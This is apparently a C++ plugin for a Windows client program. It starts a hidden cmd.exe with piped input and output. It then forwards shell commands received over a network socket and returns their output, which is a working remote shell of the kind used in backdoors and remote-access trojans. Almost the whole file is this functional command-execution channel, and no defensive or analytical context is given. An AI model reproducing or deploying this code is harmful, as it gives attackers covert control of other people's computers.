#include "clientPlugin.h"
class plugin1 : public pluginBase
{
public:
      plugin1() : pluginBase()
      {
            pluginName = "plugin1";
            author = "x3fang";
            version = "1.0.0";
            PluginManager::registerFun(this);
      }
      bool runFun(clientPluginInfo &info) override
      {
            PROCESS_INFORMATION Processinfo;
            STARTUPINFO Startupinfo;
            HANDLE outputRead, outputWrite;
            HANDLE inputRead, inputWrite;
            SECURITY_ATTRIBUTES sa = {0};
            char szCMDPath[255];
            DWORD dwBytesRead = 0;
            DWORD dwBytesWrite = 0;

            sa.nLength = sizeof(sa);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = NULL;

            CreatePipe(&outputRead, &outputWrite, &sa, 0); // 创建标准输出管道
            CreatePipe(&inputRead, &inputWrite, &sa, 0);   // 创建标准输入管道

            // 配内存资源，初始化数据
            ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
            ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
            GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

            // 设置启动信息
            Startupinfo.cb = sizeof(STARTUPINFO);
            Startupinfo.wShowWindow = SW_HIDE;
            Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            Startupinfo.hStdInput = (HANDLE)inputRead;
            Startupinfo.hStdOutput = (HANDLE)outputWrite;
            Startupinfo.hStdError = (HANDLE)outputWrite;

            // 创建cmd进程
            if (CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo))
            {
                  CloseHandle(outputWrite);
                  CloseHandle(inputRead);

                  char cbuf[16384] = {0};
                  std::string buf;
                  std::string rbuf;
                  buf = readPipeALLData(outputRead).first;
                  send_message(s, buf);
                  while (1)
                  {
                        receive_message(s, buf);

                        WriteFile(inputWrite, buf.c_str(), strlen(buf.c_str()), &dwBytesWrite, NULL);
                        rbuf = readPipeALLData(outputRead).first;

                        send_message(s, rbuf);

                        if (buf == "\r\nexit\r\n")
                              break;
                  }
            }
            else
            {
                  // 错误处理
                  std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
            }

            // 关闭进程句柄
            CloseHandle(Processinfo.hProcess);
            CloseHandle(Processinfo.hThread);
            return true;
      }

private:
      std::pair<std::string, DWORD> readPipeALLData(HANDLE outputRead)
      {
            std::string res;
            char cbuf[512] = {0};
            DWORD dwBytesRead = 0;
            DWORD mode = PIPE_NOWAIT;
            SetNamedPipeHandleState(outputRead, &mode, NULL, NULL);
            int flag = 0;
            const int retry = 5;      // 判断是否是第5次遇到 ERROR_NO_DATA (重试次数)
            const int sleepTime = 10; // 单位毫秒
            do
            {
                  ReadFile(outputRead, cbuf, sizeof(cbuf), &dwBytesRead, NULL);
                  DWORD error = GetLastError();
                  if (error == ERROR_NO_DATA)
                  {
                        SetLastError(ERROR_SUCCESS);
                        if (flag == retry)
                              break;
                        ++flag;
                        Sleep(sleepTime);
                        continue;
                  }
                  res += cbuf;
                  memset(cbuf, 0, sizeof(cbuf));
                  if (dwBytesRead == 0)
                        break;
            } while (true);
            return make_pair(res, dwBytesRead);
      }
};
plugin1 plugin1PLUGIN;
/*

void run()
{

}
*/